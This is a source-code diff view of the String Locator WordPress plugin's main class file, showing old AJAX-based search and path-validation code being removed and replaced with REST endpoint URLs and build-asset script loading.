  | 305 |  | ~~$files = $this->ajax\_scan\_path( $scan\_path->path );~~ |
  | 306 |  | ~~}~~ |
  | 307 |  |  |
  | 308 |  | ~~/\*~~ |
  | 309 |  | ~~\* Make sure each chunk of file arrays never exceeds 500 files~~ |
  | 310 |  | ~~\* This is to prevent the SQL string from being too large and crashing everything~~ |
  | 311 |  | ~~\*/~~ |
  | 312 |  | ~~$back\_compat\_filter = apply\_filters( 'string-locator-files-per-array', 500 ); //phpcs:ignore WordPress.NamingConventions.ValidHookName.UseUnderscores~~ |
  | 313 |  |  |
  | 314 |  | ~~$file\_chunks = array\_chunk( $files, apply\_filters( 'string\_locator\_files\_per\_array', $back\_compat\_filter ), true );~~ |
  | 315 |  |  |
  | 316 |  | ~~$store = (object) array(~~ |
  | 317 |  | ~~'scan\_path' => $scan\_path,~~ |
  | 318 |  | ~~'search'    => wp\_unslash( $\_POST['search'] ),~~ |
  | 319 |  | ~~'directory' => $\_POST['directory'],~~ |
  | 320 |  | ~~'chunks'    => count( $file\_chunks ),~~ |
  | 321 |  | ~~'regex'     => $\_POST['regex'],~~ |
  | 322 |  | ~~);~~ |
  | 323 |  |  |
  | 324 |  | ~~$response = array(~~ |
  | 325 |  | ~~'total'     => count( $files ),~~ |
  | 326 |  | ~~'current'   => 0,~~ |
  | 327 |  | ~~'directory' => $scan\_path,~~ |
  | 328 |  | ~~'chunks'    => count( $file\_chunks ),~~ |
  | 329 |  | ~~'regex'     => $\_POST['regex'],~~ |
  | 330 |  | ~~);~~ |
  | 331 |  |  |
  | 332 |  | ~~set\_transient( 'string-locator-search-overview', $store );~~ |
  | 333 |  | ~~update\_option( 'string-locator-search-history', array(), false );~~ |
  | 334 |  |  |
  | 335 |  | ~~foreach ( $file\_chunks as $count => $file\_chunk ) {~~ |
  | 336 |  | ~~set\_transient( 'string-locator-search-files-' . $count, $file\_chunk );~~ |
  | 337 |  | ~~}~~ |
  | 338 |  |  |
  | 339 |  | ~~wp\_send\_json\_success( $response );~~ |
  | 340 |  | ~~}~~ |
  | 341 |  |  |
  | 342 |  | ~~/\*\*~~ |
  | 343 |  | ~~\* Check if the script is about to exceed the max execution time.~~ |
  | 344 |  | ~~\*~~ |
  | 345 |  | ~~\* @since 1.9.0~~ |
  | 346 |  | ~~\*~~ |
  | 347 |  | ~~\* @return bool~~ |
  | 348 |  | ~~\*/~~ |
  | 349 |  | ~~function nearing\_execution\_limit() {~~ |
  | 350 |  | ~~// Max execution time is 0 or -1 (infinite) in server config~~ |
  | 351 |  | ~~if ( 0 === $this->max\_execution\_time || - 1 === $this->max\_execution\_time ) {~~ |
  | 352 |  | ~~return false;~~ |
  | 353 |  | ~~}~~ |
  | 354 |  |  |
  | 355 |  | ~~$back\_compat\_filter = apply\_filters( 'string-locator-extra-search-delay', 2 ); // phpcs:ignore WordPress.NamingConventions.ValidHookName.UseUnderscores~~ |
  | 356 |  |  |
  | 357 |  | ~~$built\_in\_delay = apply\_filters( 'string\_locator\_extra\_search\_delay', $back\_compat\_filter );~~ |
  | 358 |  | ~~$execution\_time = ( microtime( true ) - $this->start\_execution\_timer + $built\_in\_delay );~~ |
  | 359 |  |  |
  | 360 |  | ~~if ( $execution\_time >= $this->max\_execution\_time ) {~~ |
  | 361 |  | ~~return $execution\_time;~~ |
  | 362 |  | ~~}~~ |
  | 363 |  |  |
  | 364 |  | ~~return false;~~ |
  | 365 |  | ~~}~~ |
  | 366 |  |  |
  | 367 |  | ~~/\*\*~~ |
  | 368 |  | ~~\* Check if the script is about to exceed the server memory limit.~~ |
  | 369 |  | ~~\*~~ |
  | 370 |  | ~~\* @since 2.0.0~~ |
  | 371 |  | ~~\*~~ |
  | 372 |  | ~~\* @return bool~~ |
  | 373 |  | ~~\*/~~ |
  | 374 |  | ~~function nearing\_memory\_limit() {~~ |
  | 375 |  | ~~// Check if the memory limit is set t o0 or -1 (infinite) in server config~~ |
  | 376 |  | ~~if ( 0 === $this->max\_memory\_consumption || - 1 === $this->max\_memory\_consumption ) {~~ |
  | 377 |  | ~~return false;~~ |
  | 378 |  | ~~}~~ |
  | 379 |  |  |
  | 380 |  | ~~// We give our selves a 256k memory buffer, as we need to close off the script properly as well~~ |
  | 381 |  | ~~$back\_compat\_filter = apply\_filters( 'string-locator-extra-memory-buffer', 256000 ); //phpcs:ignore WordPress.NamingConventions.ValidHookName.UseUnderscores~~ |
  | 382 |  | ~~$built\_in\_buffer    = apply\_filters( 'string\_locator\_extra\_memory\_buffer', $back\_compat\_filter );~~ |
  | 383 |  | ~~$memory\_use         = ( memory\_get\_usage( true ) + $built\_in\_buffer );~~ |
  | 384 |  |  |
  | 385 |  | ~~if ( $memory\_use >= $this->max\_memory\_consumption ) {~~ |
  | 386 |  | ~~return $memory\_use;~~ |
  | 387 |  | ~~}~~ |
  | 388 |  |  |
  | 389 |  | ~~return false;~~ |
  | 390 |  | ~~}~~ |
  | 391 |  |  |
  | 392 |  | ~~public static function absbool( $value ) {~~ |
  | 393 |  | ~~if ( is\_bool( $value ) ) {~~ |
  | 394 |  | ~~$bool = $value;~~ |
  | 395 |  | ~~} else {~~ |
  | 396 |  | ~~if ( 'false' === $value ) {~~ |
  | 397 |  | ~~$bool = false;~~ |
  | 398 |  | ~~} else {~~ |
  | 399 |  | ~~$bool = true;~~ |
  | 400 |  | ~~}~~ |
  | 401 |  | ~~}~~ |
  | 402 |  |  |
  | 403 |  | ~~return $bool;~~ |
  | 404 |  | ~~}~~ |
  | 405 |  |  |
  | 406 |  | ~~/\*\*~~ |
  | 407 |  | ~~\* Search an individual file supplied via AJAX.~~ |
  | 408 |  | ~~\*~~ |
  | 409 |  | ~~\* @since 1.9.0~~ |
  | 410 |  | ~~\*~~ |
  | 411 |  | ~~\* @return void~~ |
  | 412 |  | ~~\*/~~ |
  | 413 |  | ~~function ajax\_file\_search() {~~ |
  | 414 |  | ~~if ( ! check\_ajax\_referer( 'string-locator-search', 'nonce', false ) ) {~~ |
  | 415 |  | ~~wp\_send\_json\_error( \_\_( 'Authentication failed', 'string-locator' ) );~~ |
  | 416 |  | ~~}~~ |
  | 417 |  |  |
  | 418 |  | ~~$back\_compat\_filter = apply\_filters( 'string-locator-files-per-array', 500 ); // phpcs:ignore WordPress.NamingConventions.ValidHookName.UseUnderscores~~ |
  | 419 |  |  |
  | 420 |  | ~~$files\_per\_chunk = apply\_filters( 'string\_locator\_files\_per\_array', $back\_compat\_filter );~~ |
  | 421 |  | ~~$response        = array(~~ |
  | 422 |  | ~~'search'  => array(),~~ |
  | 423 |  | ~~'filenum' => absint( $\_POST['filenum'] ),~~ |
  | 424 |  | ~~);~~ |
  | 425 |  |  |
  | 426 |  | ~~$filenum   = absint( $\_POST['filenum'] );~~ |
  | 427 |  | ~~$next\_file = $filenum + 1;~~ |
  | 428 |  |  |
  | 429 |  | ~~$next\_chunk = ( ceil( ( $next\_file ) / $files\_per\_chunk ) - 1 );~~ |
  | 430 |  | ~~$chunk      = ( ceil( $filenum / $files\_per\_chunk ) - 1 );~~ |
  | 431 |  | ~~if ( $chunk < 0 ) {~~ |
  | 432 |  | ~~$chunk = 0;~~ |
  | 433 |  | ~~}~~ |
  | 434 |  | ~~if ( $next\_chunk < 0 ) {~~ |
  | 435 |  | ~~$next\_chunk = 0;~~ |
  | 436 |  | ~~}~~ |
  | 437 |  |  |
  | 438 |  | ~~$scan\_data = get\_transient( 'string-locator-search-overview' );~~ |
  | 439 |  | ~~$file\_data = get\_transient( 'string-locator-search-files-' . $chunk );~~ |
  | 440 |  |  |
  | 441 |  | ~~if ( ! isset( $file\_data[ $filenum ] ) ) {~~ |
  | 442 |  | ~~wp\_send\_json\_error(~~ |
  | 443 |  | ~~array(~~ |
  | 444 |  | ~~'continue' => false,~~ |
  | 445 |  | ~~'message'  => sprintf(~~ |
  | 446 |  | ~~/\* translators: %d: The numbered reference to a file being searched. \*/~~ |
  | 447 |  | ~~esc\_html\_\_( 'The file-number, %d, that was sent could not be found.', 'string-locator' ),~~ |
  | 448 |  | ~~$filenum~~ |
  | 449 |  | ~~),~~ |
  | 450 |  | ~~)~~ |
  | 451 |  | ~~);~~ |
  | 452 |  | ~~}~~ |
  | 453 |  |  |
  | 454 |  | ~~if ( $this->nearing\_execution\_limit() ) {~~ |
  | 455 |  | ~~wp\_send\_json\_error(~~ |
  | 456 |  | ~~array(~~ |
  | 457 |  | ~~'continue' => false,~~ |
  | 458 |  | ~~'message'  => sprintf(~~ |
  | 459 |  | ~~/\* translators: %1$d: The time a PHP file can run, as defined by the server configuration. %2$d: The amount of time used by the PHP file so far. \*/~~ |
  | 460 |  | ~~esc\_html\_\_( 'The maximum time your server allows a script to run (%1$d) is too low for the plugin to run as intended, at startup %2$d seconds have passed', 'string-locator' ),~~ |
  | 461 |  | ~~$this->max\_execution\_time,~~ |
  | 462 |  | ~~$this->nearing\_execution\_limit()~~ |
  | 463 |  | ~~),~~ |
  | 464 |  | ~~)~~ |
  | 465 |  | ~~);~~ |
  | 466 |  | ~~}~~ |
  | 467 |  | ~~if ( $this->nearing\_memory\_limit() ) {~~ |
  | 468 |  | ~~wp\_send\_json\_error(~~ |
  | 469 |  | ~~array(~~ |
  | 470 |  | ~~'continue' => false,~~ |
  | 471 |  | ~~'message'  => sprintf(~~ |
  | 472 |  | ~~/\* translators: %1$d: Current amount of used system memory resources. %2$d: The maximum available system memory. \*/~~ |
  | 473 |  | ~~esc\_html\_\_( 'The memory limit is about to be exceeded before the search has started, this could be an early indicator that your site may soon struggle as well, unfortunately this means the plugin is unable to perform any searches. Current memory consumption: %1$d of %2$d bytes', 'string-locator' ),~~ |
  | 474 |  | ~~$this->nearing\_memory\_limit(),~~ |
  | 475 |  | ~~$this->max\_memory\_consumption~~ |
  | 476 |  | ~~),~~ |
  | 477 |  | ~~)~~ |
  | 478 |  | ~~);~~ |
  | 479 |  | ~~}~~ |
  | 480 |  |  |
  | 481 |  | ~~$is\_regex = false;~~ |
  | 482 |  | ~~if ( isset( $scan\_data->regex ) ) {~~ |
  | 483 |  | ~~$is\_regex = $this->absbool( $scan\_data->regex );~~ |
  | 484 |  | ~~}~~ |
  | 485 |  |  |
  | 486 |  | ~~if ( $is\_regex ) {~~ |
  | 487 |  | ~~if ( false === @preg\_match( $scan\_data->search, '' ) ) { // phpcs:ignore WordPress.PHP.NoSilencedErrors.Discouraged~~ |
  | 488 |  | ~~wp\_send\_json\_error(~~ |
  | 489 |  | ~~array(~~ |
  | 490 |  | ~~'continue' => false,~~ |
  | 491 |  | ~~'message'  => sprintf(~~ |
  | 492 |  | ~~/\* translators: %s: The search string used. \*/~~ |
  | 493 |  | ~~\_\_( 'Your search string, <strong>%s</strong>, is not a valid pattern, and the search has been aborted.', 'string-locator' ),~~ |
  | 494 |  | ~~esc\_html( $scan\_data->search )~~ |
  | 495 |  | ~~),~~ |
  | 496 |  | ~~)~~ |
  | 497 |  | ~~);~~ |
  | 498 |  | ~~}~~ |
  | 499 |  | ~~}~~ |
  | 500 |  |  |
  | 501 |  | ~~while ( ! $this->nearing\_execution\_limit() && ! $this->nearing\_memory\_limit() && isset( $file\_data[ $filenum ] ) ) {~~ |
  | 502 |  | ~~$filenum        = absint( $\_POST['filenum'] );~~ |
  | 503 |  | ~~$search\_results = null;~~ |
  | 504 |  | ~~$next\_file      = $filenum + 1;~~ |
  | 505 |  |  |
  | 506 |  | ~~$next\_chunk = ( ceil( ( $next\_file ) / $files\_per\_chunk ) - 1 );~~ |
  | 507 |  | ~~$chunk      = ( ceil( $filenum / $files\_per\_chunk ) - 1 );~~ |
  | 508 |  | ~~if ( $chunk < 0 ) {~~ |
  | 509 |  | ~~$chunk = 0;~~ |
  | 510 |  | ~~}~~ |
  | 511 |  | ~~if ( $next\_chunk < 0 ) {~~ |
  | 512 |  | ~~$next\_chunk = 0;~~ |
  | 513 |  | ~~}~~ |
  | 514 |  |  |
  | 515 |  | ~~if ( ! isset( $file\_data[ $filenum ] ) ) {~~ |
  | 516 |  | ~~$chunk ++;~~ |
  | 517 |  | ~~$file\_data = get\_transient( 'string-locator-search-files-' . $chunk );~~ |
  | 518 |  | ~~continue;~~ |
  | 519 |  | ~~}~~ |
  | 520 |  |  |
  | 521 |  | ~~$file\_name = explode( '/', $file\_data[ $filenum ] );~~ |
  | 522 |  | ~~$file\_name = end( $file\_name );~~ |
  | 523 |  |  |
  | 524 |  | ~~/\*~~ |
  | 525 |  | ~~\* Check the file type, if it's an unsupported type, we skip it~~ |
  | 526 |  | ~~\*/~~ |
  | 527 |  | ~~$file\_type = explode( '.', $file\_name );~~ |
  | 528 |  | ~~$file\_type = strtolower( end( $file\_type ) );~~ |
  | 529 |  |  |
  | 530 |  | ~~/\*~~ |
  | 531 |  | ~~\* Scan the file and look for our string, but only if it's an approved file extension~~ |
  | 532 |  | ~~\*/~~ |
  | 533 |  | ~~$bad\_file\_types = apply\_filters( 'string\_locator\_bad\_file\_types', $this->bad\_file\_types );~~ |
  | 534 |  | ~~if ( ! in\_array( $file\_type, $bad\_file\_types, true ) ) {~~ |
  | 535 |  | ~~$search\_results = $this->scan\_file( $file\_data[ $filenum ], $scan\_data->search, $file\_data[ $filenum ], $scan\_data->scan\_path->type, '', $is\_regex );~~ |
  | 536 |  | ~~}~~ |
  | 537 |  |  |
  | 538 |  | ~~$response['last\_file'] = $file\_data[ $filenum ];~~ |
  | 539 |  | ~~$response['filenum']   = $filenum;~~ |
  | 540 |  | ~~$response['filename']  = $file\_name;~~ |
  | 541 |  | ~~if ( $search\_results ) {~~ |
  | 542 |  | ~~$response['search'][] = $search\_results;~~ |
  | 543 |  | ~~}~~ |
  | 544 |  |  |
  | 545 |  | ~~if ( $next\_chunk !== $chunk ) {~~ |
  | 546 |  | ~~$file\_data = get\_transient( 'string-locator-search-files-' . $next\_chunk );~~ |
  | 547 |  | ~~}~~ |
  | 548 |  |  |
  | 549 |  | ~~$response['next\_file'] = ( isset( $file\_data[ $next\_file ] ) ? $file\_data[ $next\_file ] : '' );~~ |
  | 550 |  |  |
  | 551 |  | ~~if ( ! empty( $search\_results ) ) {~~ |
  | 552 |  | ~~$history = get\_option( 'string-locator-search-history', array() );~~ |
  | 553 |  | ~~$history = array\_merge( $history, $search\_results );~~ |
  | 554 |  | ~~update\_option( 'string-locator-search-history', $history, false );~~ |
  | 555 |  | ~~}~~ |
  | 556 |  |  |
  | 557 |  | ~~$\_POST['filenum'] ++;~~ |
  | 558 |  | ~~}~~ |
  | 559 |  |  |
  | 560 |  | ~~wp\_send\_json\_success( $response );~~ |
  | 561 |  | ~~}~~ |
  | 562 |  |  |
  | 563 |  | ~~/\*\*~~ |
  | 564 |  | ~~\* Clean up our options used to help during the search.~~ |
  | 565 |  | ~~\*~~ |
  | 566 |  | ~~\* @return void~~ |
  | 567 |  | ~~\*/~~ |
  | 568 |  | ~~function ajax\_clean\_search() {~~ |
  | 569 |  | ~~if ( ! check\_ajax\_referer( 'string-locator-search', 'nonce', false ) ) {~~ |
  | 570 |  | ~~wp\_send\_json\_error( \_\_( 'Authentication failed', 'string-locator' ) );~~ |
  | 571 |  | ~~}~~ |
  | 572 |  |  |
  | 573 |  | ~~$scan\_data = get\_transient( 'string-locator-search-overview' );~~ |
  | 574 |  | ~~for ( $i = 0; $i < $scan\_data->chunks; $i ++ ) {~~ |
  | 575 |  | ~~delete\_transient( 'string-locator-search-files-' . $i );~~ |
  | 576 |  | ~~}~~ |
  | 577 |  |  |
  | 578 |  | ~~wp\_send\_json\_success( true );~~ |
  | 579 | 308 | } |
  | 580 | 309 |  |
  | […](/browser/string-locator/trunk/includes/class-string-locator.php?rev=2432238#L648) | […](/browser/string-locator/trunk/includes/class-string-locator.php?rev=2685592#L377) |  |
  | 648 | 377 | $table\_columns = sprintf( |
  | 649 | 378 | '<tr> |
  | 650 |  | <th scope="col" class="manage-column column-stringresult column-primary">%s</th> |
  | 651 |  | <th scope="col" class="manage-column column-filename">%s</th> |
  | 652 |  | <th scope="col" class="manage-column column-linenum">%s</th> |
  | 653 |  | <th scope="col" class="manage-column column-linepos">%s</th> |
  |  | 379 | <th scope="col" class="manage-column column-stringresult column-primary string">%s</th> |
  |  | 380 | <th scope="col" class="manage-column column-filename filename">%s</th> |
  |  | 381 | <th scope="col" class="manage-column column-linenum line">%s</th> |
  |  | 382 | <th scope="col" class="manage-column column-linepos position">%s</th> |
  | 654 | 383 | </tr>', |
  | 655 | 384 | esc\_html( \_\_( 'String', 'string-locator' ) ), |
  | […](/browser/string-locator/trunk/includes/class-string-locator.php?rev=2432238#L676) | […](/browser/string-locator/trunk/includes/class-string-locator.php?rev=2685592#L405) |  |
  | 676 | 405 |  |
  | 677 | 406 | /\*\* |
  | 678 |  | ~~\* Create an admin edit link for the supplied path.~~ |
  | 679 |  | ~~\*~~ |
  | 680 |  | ~~\* @param string $path Path to the file we'er adding a link for.~~ |
  | 681 |  | ~~\* @param int $line The line in the file where our search result was found.~~ |
  | 682 |  | ~~\* @param int $linepos The positin in the line where the search result was found.~~ |
  | 683 |  | ~~\*~~ |
  | 684 |  | ~~\* @return string~~ |
  | 685 |  | ~~\*/~~ |
  | 686 |  | ~~function create\_edit\_link( $path, $line = 0, $linepos = 0 ) {~~ |
  | 687 |  | ~~$file\_type    = 'core';~~ |
  | 688 |  | ~~$file\_slug    = '';~~ |
  | 689 |  | ~~$content\_path = str\_replace( '\\', '/', WP\_CONTENT\_DIR );~~ |
  | 690 |  |  |
  | 691 |  | ~~$path  = str\_replace( '\\', '/', $path );~~ |
  | 692 |  | ~~$paths = explode( '/', $path );~~ |
  | 693 |  |  |
  | 694 |  | ~~$url\_args = array(~~ |
  | 695 |  | ~~'page=string-locator',~~ |
  | 696 |  | ~~'edit-file=' . end( $paths ),~~ |
  | 697 |  | ~~);~~ |
  | 698 |  |  |
  | 699 |  | ~~switch ( true ) {~~ |
  | 700 |  | ~~case ( in\_array( 'wp-content', $paths, true ) && in\_array( 'plugins', $paths, true ) ):~~ |
  | 701 |  | ~~$file\_type     = 'plugin';~~ |
  | 702 |  | ~~$content\_path .= '/plugins/';~~ |
  | 703 |  | ~~break;~~ |
  | 704 |  | ~~case ( in\_array( 'wp-content', $paths, true ) && in\_array( 'themes', $paths, true ) ):~~ |
  | 705 |  | ~~$file\_type     = 'theme';~~ |
  | 706 |  | ~~$content\_path .= '/themes/';~~ |
  | 707 |  | ~~break;~~ |
  | 708 |  | ~~}~~ |
  | 709 |  |  |
  | 710 |  | ~~$rel\_path  = str\_replace( $content\_path, '', $path );~~ |
  | 711 |  | ~~$rel\_paths = explode( '/', $rel\_path );~~ |
  | 712 |  |  |
  | 713 |  | ~~if ( 'core' !== $file\_type ) {~~ |
  | 714 |  | ~~$file\_slug = $rel\_paths[0];~~ |
  | 715 |  | ~~}~~ |
  | 716 |  |  |
  | 717 |  | ~~$url\_args[] = 'file-reference=' . $file\_slug;~~ |
  | 718 |  | ~~$url\_args[] = 'file-type=' . $file\_type;~~ |
  | 719 |  | ~~$url\_args[] = 'string-locator-line=' . absint( $line );~~ |
  | 720 |  | ~~$url\_args[] = 'string-locator-linepos=' . absint( $linepos );~~ |
  | 721 |  | ~~$url\_args[] = 'string-locator-path=' . urlencode( str\_replace( '/', DIRECTORY\_SEPARATOR, $path ) );~~ |
  | 722 |  |  |
  | 723 |  | ~~$url = admin\_url( $this->path\_to\_use . '?' . implode( '&', $url\_args ) );~~ |
  | 724 |  |  |
  | 725 |  | ~~return $url;~~ |
  | 726 |  | ~~}~~ |
  | 727 |  |  |
  | 728 |  | ~~/\*\*~~ |
  | 729 |  | ~~\* Parse the search option to determine what kind of search we are performing and what directory to start in.~~ |
  | 730 |  | ~~\*~~ |
  | 731 |  | ~~\* @param string $option The search-type identifier.~~ |
  | 732 |  | ~~\*~~ |
  | 733 |  | ~~\* @return bool|object~~ |
  | 734 |  | ~~\*/~~ |
  | 735 |  | ~~function prepare\_scan\_path( $option ) {~~ |
  | 736 |  | ~~$data = array(~~ |
  | 737 |  | ~~'path' => '',~~ |
  | 738 |  | ~~'type' => '',~~ |
  | 739 |  | ~~'slug' => '',~~ |
  | 740 |  | ~~);~~ |
  | 741 |  |  |
  | 742 |  | ~~switch ( true ) {~~ |
  | 743 |  | ~~case ( 't--' === $option ):~~ |
  | 744 |  | ~~$data['path'] = WP\_CONTENT\_DIR . '/themes/';~~ |
  | 745 |  | ~~$data['type'] = 'theme';~~ |
  | 746 |  | ~~break;~~ |
  | 747 |  | ~~case ( strlen( $option ) > 3 && 't-' === substr( $option, 0, 2 ) ):~~ |
  | 748 |  | ~~$data['path'] = WP\_CONTENT\_DIR . '/themes/' . substr( $option, 2 );~~ |
  | 749 |  | ~~$data['type'] = 'theme';~~ |
  | 750 |  | ~~$data['slug'] = substr( $option, 2 );~~ |
  | 751 |  | ~~break;~~ |
  | 752 |  | ~~case ( 'p--' === $option ):~~ |
  | 753 |  | ~~$data['path'] = WP\_CONTENT\_DIR . '/plugins/';~~ |
  | 754 |  | ~~$data['type'] = 'plugin';~~ |
  | 755 |  | ~~break;~~ |
  | 756 |  | ~~case ( 'mup--' === $option ):~~ |
  | 757 |  | ~~$data['path'] = WP\_CONTENT\_DIR . '/mu-plugins/';~~ |
  | 758 |  | ~~$data['type'] = 'mu-plugin';~~ |
  | 759 |  | ~~break;~~ |
  | 760 |  | ~~case ( strlen( $option ) > 3 && 'p-' === substr( $option, 0, 2 ) ):~~ |
  | 761 |  | ~~$slug = explode( '/', substr( $option, 2 ) );~~ |
  | 762 |  |  |
  | 763 |  | ~~$data['path'] = WP\_CONTENT\_DIR . '/plugins/' . $slug[0];~~ |
  | 764 |  | ~~$data['type'] = 'plugin';~~ |
  | 765 |  | ~~$data['slug'] = $slug[0];~~ |
  | 766 |  | ~~break;~~ |
  | 767 |  | ~~case ( 'core' === $option ):~~ |
  | 768 |  | ~~$data['path'] = ABSPATH;~~ |
  | 769 |  | ~~$data['type'] = 'core';~~ |
  | 770 |  | ~~break;~~ |
  | 771 |  | ~~case ( 'wp-content' === $option ):~~ |
  | 772 |  | ~~$data['path'] = WP\_CONTENT\_DIR;~~ |
  | 773 |  | ~~$data['type'] = 'core';~~ |
  | 774 |  | ~~break;~~ |
  | 775 |  | ~~}~~ |
  | 776 |  |  |
  | 777 |  | ~~if ( empty( $data['path'] ) ) {~~ |
  | 778 |  | ~~return false;~~ |
  | 779 |  | ~~}~~ |
  | 780 |  |  |
  | 781 |  | ~~return (object) $data;~~ |
  | 782 |  | ~~}~~ |
  | 783 |  |  |
  | 784 |  | ~~/\*\*~~ |
  | 785 |  | ~~\* Check if a file path is valid for editing.~~ |
  | 786 |  | ~~\*~~ |
  | 787 |  | ~~\* @param string $path Path to file.~~ |
  | 788 |  | ~~\*~~ |
  | 789 |  | ~~\* @return bool~~ |
  | 790 |  | ~~\*/~~ |
  | 791 |  | ~~function is\_valid\_location( $path ) {~~ |
  | 792 |  | ~~$valid   = true;~~ |
  | 793 |  | ~~$path    = str\_replace( array( '/' ), array( DIRECTORY\_SEPARATOR ), stripslashes( $path ) );~~ |
  | 794 |  | ~~$abspath = str\_replace( array( '/' ), array( DIRECTORY\_SEPARATOR ), ABSPATH );~~ |
  | 795 |  |  |
  | 796 |  | ~~// Check that it is a valid file we are trying to access as well.~~ |
  | 797 |  | ~~if ( ! file\_exists( $path ) ) {~~ |
  | 798 |  | ~~$valid = false;~~ |
  | 799 |  | ~~}~~ |
  | 800 |  |  |
  | 801 |  | ~~if ( empty( $path ) ) {~~ |
  | 802 |  | ~~$valid = false;~~ |
  | 803 |  | ~~}~~ |
  | 804 |  | ~~if ( stristr( $path, '..' ) ) {~~ |
  | 805 |  | ~~$valid = false;~~ |
  | 806 |  | ~~}~~ |
  | 807 |  | ~~if ( ! stristr( $path, $abspath ) ) {~~ |
  | 808 |  | ~~$valid = false;~~ |
  | 809 |  | ~~}~~ |
  | 810 |  |  |
  | 811 |  | ~~return $valid;~~ |
  | 812 |  | ~~}~~ |
  | 813 |  |  |
  | 814 |  | ~~/\*\*~~ |
  | 815 | 407 | \* Set the text domain for translated plugin content. |
  | 816 | 408 | \* |
  | […](/browser/string-locator/trunk/includes/class-string-locator.php?rev=2432238#L820) | […](/browser/string-locator/trunk/includes/class-string-locator.php?rev=2685592#L412) |  |
  | 820 | 412 | $i18n\_dir = 'string-locator/languages/'; |
  | 821 | 413 | load\_plugin\_textdomain( 'string-locator', false, $i18n\_dir ); |
  |  | 414 | } |
  |  | 415 |  |
  |  | 416 | /\*\* |
  |  | 417 | \* Convert a value to its absolute boolean interpretation. |
  |  | 418 | \* |
  |  | 419 | \* @param $value |
  |  | 420 | \* |
  |  | 421 | \* @return bool |
  |  | 422 | \*/ |
  |  | 423 | public static function absbool( $value ) { |
  |  | 424 | if ( is\_bool( $value ) ) { |
  |  | 425 | $bool = $value; |
  |  | 426 | } else { |
  |  | 427 | if ( 'false' === $value ) { |
  |  | 428 | $bool = false; |
  |  | 429 | } else { |
  |  | 430 | $bool = true; |
  |  | 431 | } |
  |  | 432 | } |
  |  | 433 |  |
  |  | 434 | return $bool; |
  | 822 | 435 | } |
  | 823 | 436 |  |
  | […](/browser/string-locator/trunk/includes/class-string-locator.php?rev=2432238#L833) | […](/browser/string-locator/trunk/includes/class-string-locator.php?rev=2685592#L446) |  |
  | 833 | 446 | } |
  | 834 | 447 |  |
  | 835 |  | if ( ! wp\_script\_is( 'react', 'registered' ) ) { |
  | 836 |  | wp\_register\_script( 'react', trailingslashit( STRING\_LOCATOR\_PLUGIN\_URL ) . 'resources/js/react.js', array() ); |
  | 837 |  | } |
  | 838 |  |  |
  | 839 |  | if ( ! wp\_script\_is( 'react-dom', 'registered' ) ) { |
  | 840 |  | wp\_register\_script( 'react-dom', trailingslashit( STRING\_LOCATOR\_PLUGIN\_URL ) . 'resources/js/react-dom.js', array() ); |
  | 841 |  | } |
  |  | 448 | $search = STRING\_LOCATOR\_PLUGIN\_DIR . 'build/string-locator-search.asset.php'; |
  |  | 449 | $editor = STRING\_LOCATOR\_PLUGIN\_DIR . 'build/string-locator.asset.php'; |
  |  | 450 |  |
  |  | 451 | $search = file\_exists( $search ) ? require $search : array(); |
  |  | 452 | $editor = file\_exists( $editor ) ? require $editor : array(); |
  | 842 | 453 |  |
  | 843 | 454 | /\*\* |
  | 844 | 455 | \* String Locator Styles |
  | 845 | 456 | \*/ |
  | 846 |  | wp\_enqueue\_style( 'string-locator', trailingslashit( STRING\_LOCATOR\_PLUGIN\_URL ) . '~~resources/css/string-locator.css', array(), $this->version~~ ); |
  |  | 457 | wp\_enqueue\_style( 'string-locator', trailingslashit( STRING\_LOCATOR\_PLUGIN\_URL ) . 'build/string-locator.css', array(), $search['version'] ); |
  | 847 | 458 |  |
  | 848 | 459 | if ( ! isset( $\_GET['edit-file'] ) || ! current\_user\_can( 'edit\_themes' ) ) { |
  | […](/browser/string-locator/trunk/includes/class-string-locator.php?rev=2432238#L850) | […](/browser/string-locator/trunk/includes/class-string-locator.php?rev=2685592#L461) |  |
  | 850 | 461 | \* String Locator Scripts |
  | 851 | 462 | \*/ |
  | 852 |  | wp\_enqueue\_script( 'string-locator-search', trailingslashit( STRING\_LOCATOR\_PLUGIN\_URL ) . 'resources/js/string-locator-search.js', array( 'jquery', 'wp-util' ), $this->version, true ); |
  |  | 463 | wp\_enqueue\_script( |
  |  | 464 | 'string-locator-search', |
  |  | 465 | trailingslashit( STRING\_LOCATOR\_PLUGIN\_URL ) . 'build/string-locator-search.js', |
  |  | 466 | array( 'jquery', 'wp-util' ), |
  |  | 467 | $search['version'], |
  |  | 468 | true |
  |  | 469 | ); |
  | 853 | 470 |  |
  | 854 | 471 | wp\_localize\_script( |
  | […](/browser/string-locator/trunk/includes/class-string-locator.php?rev=2432238#L856) | […](/browser/string-locator/trunk/includes/class-string-locator.php?rev=2685592#L473) |  |
  | 856 | 473 | 'string\_locator', |
  | 857 | 474 | array( |
  | 858 |  | '~~ajax\_url'              => admin\_url( 'admin-ajax.php~~' ), |
  |  | 475 | 'rest\_nonce'            => wp\_create\_nonce( 'wp\_rest' ), |
  | 859 | 476 | 'search\_nonce'          => wp\_create\_nonce( 'string-locator-search' ), |
  | 860 | 477 | 'search\_current\_prefix' => \_\_( 'Next file: ', 'string-locator' ), |
  | […](/browser/string-locator/trunk/includes/class-string-locator.php?rev=2432238#L865) | […](/browser/string-locator/trunk/includes/class-string-locator.php?rev=2685592#L482) |  |
  | 865 | 482 | 'search\_no\_results'     => \_\_( 'Your search was completed, but no results were found.', 'string-locator' ), |
  | 866 | 483 | 'warning\_title'         => \_\_( 'Warning', 'string-locator' ), |
  |  | 484 | 'url'                   => array( |
  |  | 485 | 'search'              => get\_rest\_url( null, 'string-locator/v1/search' ), |
  |  | 486 | 'clean'               => get\_rest\_url( null, 'string-locator/v1/clean' ), |
  |  | 487 | 'directory\_structure' => get\_rest\_url( null, 'string-locator/v1/get-directory-structure' ), |
  |  | 488 | ), |
  | 867 | 489 | ) |
  | 868 | 490 | ); |
  | […](/browser/string-locator/trunk/includes/class-string-locator.php?rev=2432238#L878) | […](/browser/string-locator/trunk/includes/class-string-locator.php?rev=2685592#L500) |  |
  | 878 | 500 | \* String Locator Scripts |
  | 879 | 501 | \*/ |
  | 880 |  | wp\_enqueue\_script( 'string-locator-editor', trailingslashit( STRING\_LOCATOR\_PLUGIN\_URL ) . 'resources/js/string-locator.js', array( 'jquery', 'code-editor', 'wp-util' ), $this->version, true ); |
  |  | 502 | wp\_enqueue\_script( |
  |  | 503 | 'string-locator-editor', |
  |  | 504 | trailingslashit( STRING\_LOCATOR\_PLUGIN\_URL ) . 'build/string-locator.js', |
  |  | 505 | array( 'jquery', 'code-editor', 'wp-util' ), |
